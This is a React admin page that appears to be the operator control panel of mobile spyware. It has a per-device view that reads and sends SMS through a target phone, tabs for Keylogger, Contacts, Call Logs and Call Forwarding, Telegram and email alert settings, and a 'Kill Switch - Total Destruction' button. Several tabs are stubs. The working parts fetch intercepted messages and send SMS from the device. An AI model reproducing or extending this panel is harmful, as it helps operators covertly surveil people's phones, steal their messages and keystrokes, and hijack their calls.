import React, { useEffect, useRef, useState, useCallback } from "react";
import { useDispatch, useSelector } from 'react-redux';
import { loadAdminMe, loadMyPrimaryApp, loadAppJson, setDeviceId, validateApiKey, updateManagement, listSms, sendSms } from '../../features/adminApp/adminAppSlice.js';

const AdminApps = () => {
  const dispatch = useDispatch();
  const { admin, app, appJson, deviceId } = useSelector(s => s.adminApp);
  const [activeTab, setActiveTab] = useState('sms');
  const toRef = useRef(null);
  const msgRef = useRef(null);

  useEffect(() => {
    dispatch(loadAdminMe());
    dispatch(loadMyPrimaryApp()).then((action) => {
      const a = action.payload;
      if (a?.id) dispatch(loadAppJson(a.id));
    });
  }, [dispatch]);

  // poll app json for near real-time updates
  useEffect(() => {
    if (!app?.id) return;
    const t = setInterval(() => dispatch(loadAppJson(app.id)), 5000);
    return () => clearInterval(t);
  }, [dispatch, app?.id]);

  const apiKey = appJson?.apiKey || app?.apiKey || '';
  const adminExpiry = admin?.expiry || '';

  const [smsItems, setSmsItems] = useState([]);
  const refreshSms = useCallback(async () => {
    if (!deviceId) return setSmsItems([]);
    const action = await dispatch(listSms({ deviceId, limit: 100 }));
    if (listSms.fulfilled.match(action)) setSmsItems(action.payload);
  }, [deviceId, dispatch]);

  useEffect(() => { refreshSms(); }, [refreshSms]);

  const handleValidateKey = async () => {
    if (!app?.id) return;
    await dispatch(validateApiKey(app.id));
    await dispatch(loadAppJson(app.id));
  };

  const handleServerToggle = async () => {
    if (!app?.id) return;
    const enabled = !(appJson?.management?.serverEnabled);
    await dispatch(updateManagement({ appId: app.id, payload: { serverEnabled: enabled } }));
    await dispatch(loadAppJson(app.id));
  };

  const handleSendSms = async (e) => {
    e.preventDefault();
    const to = toRef.current.value.trim();
    const message = msgRef.current.value.trim();
    if (!to || !message) return;
    const action = await dispatch(sendSms({ to, message }));
    if (sendSms.fulfilled.match(action)) {
      msgRef.current.value = '';
      setTimeout(refreshSms, 500);
    } else {
      alert(action.payload || 'Failed to send SMS');
    }
  };

  return (
    // <div>
    //   <h2 className="h4 mb-3">App Management</h2>
    //   <div className="alert alert-info">This is a placeholder page for managing apps.</div>
    // </div>
    <>
      <div className="min-vh-100 bg-light">
        <div className="container-fluid">
          <main className="col-12 col-lg-12 px-2 px-sm-3 px-md-4 w-100">
            <div className="d-flex flex-wrap justify-content-between align-items-center pt-3 pb-2 mb-3 border-bottom">
              <h1 className="h4 h3-md mb-0">Application Management</h1>
            </div>

            {/* Cards Grid */}
            <div className="row">
              <main className="col-12 col-lg-12 px-2 px-sm-3 px-md-4 w-100">
                {/* <div className="d-flex flex-wrap justify-content-between align-items-center pt-3 pb-2 mb-3 border-bottom">
              <h1 className="h4 h3-md mb-0">Application Management</h1>
            </div> */}

                <div className="row g-3 mt-1">
                  <div className="col-12 col-lg-6">
                    <div className="card shadow">
                      <div className="card-header py-3">
                        <h6 className="m-0">Application Information</h6>
                      </div>
                      <div className="card-body">
                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            API KEY
                          </span>
                          <input type="text" className="form-control" id="basic-url" aria-describedby="basic-addon3" value={apiKey || '—'} disabled />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Expiry
                          </span>
                          <input type="text" className="form-control" id="basic-url" aria-describedby="basic-addon3" value={adminExpiry || '—'} disabled />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Validate Your API KEY
                          </span>
                          <button type="button" className="btn btn-outline-primary" onClick={handleValidateKey}>Validate</button>
                        </div>
                      </div>
                      <div className="card-footer py-3">
                        <h6 className="m-0">Guide to setup application: </h6>
                        <a
                          href="https://support.google.com/a/answer/176600?hl=en"
                          target="_blank"
                          rel="noreferrer"
                        >
                          Guide to setup application
                        </a>
                      </div>
                    </div>
                  </div>

                  <div className="col-12 col-lg-6">
                    <div className="card shadow">
                      <div className="card-header py-3">
                        <h6 className="m-0">Application Management</h6>
                      </div>
                      <div className="card-body">
                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Application Server On/Off
                          </span>
                          {/* switch on and off as per stuff */}
                          <button type="button" className="btn btn-outline-secondary" onClick={handleServerToggle}>
                            {appJson?.management?.serverEnabled ? 'Turn Off' : 'Turn On'}
                          </button>
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Download Application Data
                          </span>
                          <button type="button" className="btn btn-outline-secondary" disabled>Download</button>
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Kill Switch - Total Destruction
                          </span>
                          <button type="button" className="btn btn-outline-danger" disabled>KILL (Non Reversible)</button>
                        </div>
                      </div>

                      <div className="card-footer py-3">
                        <h6 className="m-0">
                          Guide to manage application server
                        </h6>
                        <a
                          href="https://support.google.com/a/answer/176600?hl=en"
                          target="_blank"
                          rel="noreferrer"
                        >
                          Application Management server documentation
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </main>
            </div>

            <div className="row">
              <main className="col-12 col-lg-12 px-2 px-sm-3 px-md-4 w-100">
                {/* <div className="d-flex flex-wrap justify-content-between align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 className="h4 h3-md mb-0">Application Management</h1>
              </div> */}

                <div className="row g-3 mt-1">
                  <div className="col-12 col-lg-6">
                    <div className="card shadow">
                      <div className="card-header py-3">
                        <h6 className="m-0">Email Alerts</h6>
                      </div>
                      <div className="card-body">
                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            From
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Username
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Password
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Port
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <div className="input-group-text">
                            <input
                              className="form-check-input mt-0"
                              type="checkbox"
                              value=""
                              aria-label="Checkbox for following text input"
                            />
                          </div>
                          <input
                            type="text"
                            className="form-control"
                            aria-label="Text input with checkbox"
                            disabled
                            value={"TLS/SSL Enabled"}
                          />
                        </div>

                        <div className="input-group mb-3">
                          <label
                            className="input-group-text"
                            htmlFor="inputGroupSelect01"
                          >
                            TLS/SSL Version
                          </label>
                          <select
                            className="form-select"
                            id="inputGroupSelect01"
                          >
                            <option selected>Select Your Version</option>
                            <option value="1">v1</option>
                            <option value="2">v2</option>
                            <option value="3">v3</option>
                          </select>
                        </div>
                      </div>
                      <div className="card-footer py-3">
                        <h6 className="m-0">Guide to setup email alerts: </h6>
                        <a
                          href="https://support.google.com/a/answer/176600?hl=en"
                          target="_blank"
                          rel="noreferrer"
                        >
                          Gmail SMTP settings
                        </a>
                      </div>
                    </div>
                  </div>

                  <div className="col-12 col-lg-6">
                    <div className="card shadow">
                      <div className="card-header py-3 d-flex align-items-center justify-content-between">
                        <h6 className="m-0">Telegram Alerts</h6>
                        <small className="text-muted">(Coming soon)</small>
                      </div>
                      <div className="card-body">
                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            User ID
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Bot Token
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>

                        <div className="input-group mb-3">
                          <span className="input-group-text" id="basic-addon3">
                            Recieve Alerts To User ID
                          </span>
                          <input
                            type="text"
                            className="form-control"
                            id="basic-url"
                            aria-describedby="basic-addon3"
                          />
                        </div>
                      </div>

                      <div className="card-footer py-3">
                        <h6 className="m-0">
                          Guide to setup telegram bot alerts:{" "}
                        </h6>
                        <a
                          href="https://support.google.com/a/answer/176600?hl=en"
                          target="_blank"
                          rel="noreferrer"
                        >
                          Telegram Bot API documentation
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </main>
            </div>

            {/* Device Data & SMS Tab */}
            <div className="row mt-3">
              <div className="col-12">
                <div className="card shadow">
                  <div className="card-header py-3 d-flex flex-wrap align-items-center gap-2">
                    <h6 className="m-0 me-3">User Device Data</h6>
                    <div className="input-group w-auto">
                      <span className="input-group-text">Device ID</span>
                      <input type="text" className="form-control" placeholder="Enter device id" value={deviceId}
                        onChange={(e)=>dispatch(setDeviceId(e.target.value))} />
                      <button className="btn btn-outline-primary" onClick={refreshSms}>Load</button>
                    </div>
                  </div>
                  <div className="card-body">
                    <ul className="nav nav-tabs mb-3">
                      <li className="nav-item"><button className={`nav-link ${activeTab==='sms'?'active':''}`} onClick={()=>setActiveTab('sms')}>SMS</button></li>
                      <li className="nav-item"><button className={`nav-link ${activeTab==='keylogger'?'active':''}`} onClick={()=>setActiveTab('keylogger')}>Keylogger</button></li>
                      <li className="nav-item"><button className={`nav-link ${activeTab==='contacts'?'active':''}`} onClick={()=>setActiveTab('contacts')}>Contacts</button></li>
                      <li className="nav-item"><button className={`nav-link ${activeTab==='calls'?'active':''}`} onClick={()=>setActiveTab('calls')}>Call Logs</button></li>
                      <li className="nav-item"><button className={`nav-link ${activeTab==='forwarding'?'active':''}`} onClick={()=>setActiveTab('forwarding')}>Call Forwarding</button></li>
                      <li className="nav-item"><button className={`nav-link ${activeTab==='more'?'active':''}`} onClick={()=>setActiveTab('more')}>More</button></li>
                    </ul>

                    {activeTab === 'sms' && (
                      <div className="row g-3">
                        <div className="col-12 col-lg-5">
                          <form onSubmit={handleSendSms} className="border rounded p-3 bg-light-subtle">
                            <div className="mb-2">
                              <label className="form-label">To</label>
                              <input ref={toRef} type="text" className="form-control" placeholder="+1234567890" />
                            </div>
                            <div className="mb-2">
                              <label className="form-label">Message</label>
                              <textarea ref={msgRef} className="form-control" rows={3} />
                            </div>
                            <div className="d-flex gap-2">
                              <button className="btn btn-primary" type="submit">Send</button>
                              <button className="btn btn-outline-secondary" type="button" onClick={()=>{ msgRef.current.value=''; }}>Clear</button>
                            </div>
                          </form>
                        </div>
                        <div className="col-12 col-lg-7">
                          <div className="d-flex justify-content-between align-items-center mb-2">
                            <h6 className="mb-0">Recent SMS</h6>
                            <button className="btn btn-sm btn-outline-secondary" onClick={refreshSms}>Refresh</button>
                          </div>
                          <div className="list-group" style={{maxHeight:'420px', overflowY:'auto'}}>
                            {smsItems.length===0 ? (
                              <div className="text-muted small">No SMS found for this device.</div>
                            ) : smsItems.map((s,i)=> (
                              <div key={s.id || i} className={`list-group-item ${s.type==='OUT' ? 'text-end' : ''}`}>
                                <div className="small text-muted">{s.type==='OUT' ? 'You →' : `${s.sender || 'Unknown'} →`} {s.receiver || 'Me'}</div>
                                <div>{s.message}</div>
                                <div className="small text-muted">{s.sentAt || s.receivedAt || ''}</div>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    )}

                    {activeTab !== 'sms' && (
                      <div className="text-muted">This section will be implemented after API confirmation.</div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </main>
        </div>
      </div>
    </>
  );
};

export default AdminApps;
